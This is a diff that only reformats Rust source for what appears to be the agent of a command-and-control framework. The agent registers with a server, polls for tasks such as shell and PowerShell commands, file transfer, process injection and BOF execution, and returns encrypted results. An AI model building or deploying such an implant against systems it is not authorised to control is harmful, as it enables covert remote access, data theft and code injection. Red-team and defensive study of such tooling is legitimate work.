@@ -1,7 +1,7 @@
-use nexus_common::*;
 use crate::communication::NetworkClient;
 use crate::execution::TaskExecutor;
 use crate::system::SystemInfo;
+use nexus_common::*;
 use std::time::Duration;
 use tokio::time::timeout;
 
@@ -23,7 +23,7 @@ impl NexusAgent {
         let network_client = NetworkClient::new(server_addr.clone());
         let task_executor = TaskExecutor::new();
         let system_info = SystemInfo::collect().await?;
-        
+
         // Determine agent capabilities based on OS and compilation features
         let mut capabilities = vec![
             "shell_execution".to_string(),
@@ -98,28 +98,35 @@ impl NexusAgent {
         // Send registration via gRPC
         let agent_id = timeout(
             Duration::from_secs(30),
-            self.network_client.register_agent(&registration_data)
-        ).await??;
+            self.network_client.register_agent(&registration_data),
+        )
+        .await??;
 
         self.id = Some(agent_id);
         self.registered = true;
         self.last_heartbeat = current_timestamp();
-        
+
         #[cfg(debug_assertions)]
-        println!("Successfully registered with agent ID: {}", self.id.as_ref().unwrap());
+        println!(
+            "Successfully registered with agent ID: {}",
+            self.id.as_ref().unwrap()
+        );
 
         Ok(())
     }
 
     async fn heartbeat(&mut self) -> Result<Vec<TaskData>> {
-        let agent_id = self.id.as_ref()
+        let agent_id = self
+            .id
+            .as_ref()
             .ok_or_else(|| NexusError::AgentError("Agent not registered".to_string()))?;
 
         // Send heartbeat and get tasks via gRPC
         let grpc_tasks = timeout(
             Duration::from_secs(15),
-            self.network_client.heartbeat(agent_id)
-        ).await??;
+            self.network_client.heartbeat(agent_id),
+        )
+        .await??;
 
         self.last_heartbeat = current_timestamp();
 
@@ -135,12 +142,15 @@ impl NexusAgent {
     }
 
     /// Convert gRPC Task to internal TaskData format
-    fn convert_grpc_task_to_task_data(&self, grpc_task: crate::communication::nexus::v1::Task) -> Result<TaskData> {
+    fn convert_grpc_task_to_task_data(
+        &self,
+        grpc_task: crate::communication::nexus::v1::Task,
+    ) -> Result<TaskData> {
         use crate::communication::nexus::v1::TaskType;
-        
+
         let task_type = match TaskType::try_from(grpc_task.task_type) {
             Ok(TaskType::ShellCommand) => "shell_command",
-            Ok(TaskType::PowershellCommand) => "powershell_command", 
+            Ok(TaskType::PowershellCommand) => "powershell_command",
             Ok(TaskType::FileUpload) => "file_upload",
             Ok(TaskType::FileDownload) => "file_download",
             Ok(TaskType::DirectoryListing) => "directory_listing",
@@ -152,7 +162,8 @@ impl NexusAgent {
             Ok(TaskType::ProcessInjection) => "process_injection",
             Ok(TaskType::BofExecution) => "bof_execution",
             _ => "unknown",
-        }.to_string();
+        }
+        .to_string();
 
         Ok(TaskData {
             task_id: grpc_task.task_id,
@@ -175,16 +186,21 @@ impl NexusAgent {
         let task_timeout = task_data.timeout.unwrap_or(300);
         let result = timeout(
             Duration::from_secs(task_timeout),
-            self.task_executor.execute_task(task_data)
-        ).await;
+            self.task_executor.execute_task(task_data),
+        )
+        .await;
 
         let task_result = match result {
-            Ok(Ok(output)) => {
-                TaskResult::success(task_id.clone(), output, (current_timestamp() - start_time) * 1000)
-            }
-            Ok(Err(e)) => {
-                TaskResult::failure(task_id.clone(), e.to_string(), (current_timestamp() - start_time) * 1000)
-            }
+            Ok(Ok(output)) => TaskResult::success(
+                task_id.clone(),
+                output,
+                (current_timestamp() - start_time) * 1000,
+            ),
+            Ok(Err(e)) => TaskResult::failure(
+                task_id.clone(),
+                e.to_string(),
+                (current_timestamp() - start_time) * 1000,
+            ),
             Err(_) => {
                 TaskResult::timeout(task_id.clone(), (current_timestamp() - start_time) * 1000)
             }
@@ -197,20 +213,20 @@ impl NexusAgent {
     }
 
     async fn send_task_result(&mut self, task_result: TaskResult) -> Result<()> {
-        let agent_id = self.id.as_ref()
+        let agent_id = self
+            .id
+            .as_ref()
             .ok_or_else(|| NexusError::AgentError("Agent not registered".to_string()))?;
 
-        let message = Message::task_result(
-            serde_json::to_string(&task_result)?,
-            agent_id.clone()
-        );
+        let message = Message::task_result(serde_json::to_string(&task_result)?, agent_id.clone());
         let encrypted_message = self.crypto.encrypt(&serde_json::to_string(&message)?)?;
 
         // Send with timeout
         let _response = timeout(
             Duration::from_secs(15),
-            self.network_client.send_message(&encrypted_message)
-        ).await??;
+            self.network_client.send_message(&encrypted_message),
+        )
+        .await??;
 
         Ok(())
     }
@@ -246,7 +262,7 @@ mod tests {
     async fn test_agent_creation() {
         let server_addr = "127.0.0.1:4444".to_string();
         let key = [0u8; 32];
-        
+
         let agent = NexusAgent::new(server_addr, key).await.unwrap();
         assert!(!agent.is_registered());
         assert!(agent.get_capabilities().len() > 0);
@@ -256,10 +272,10 @@ mod tests {
     async fn test_agent_capabilities() {
         let server_addr = "127.0.0.1:4444".to_string();
         let key = [0u8; 32];
-        
+
         let agent = NexusAgent::new(server_addr, key).await.unwrap();
         let capabilities = agent.get_capabilities();
-        
+
         assert!(capabilities.contains(&"shell_execution".to_string()));
         assert!(capabilities.contains(&"file_operations".to_string()));
         assert!(capabilities.contains(&"network_operations".to_string()));
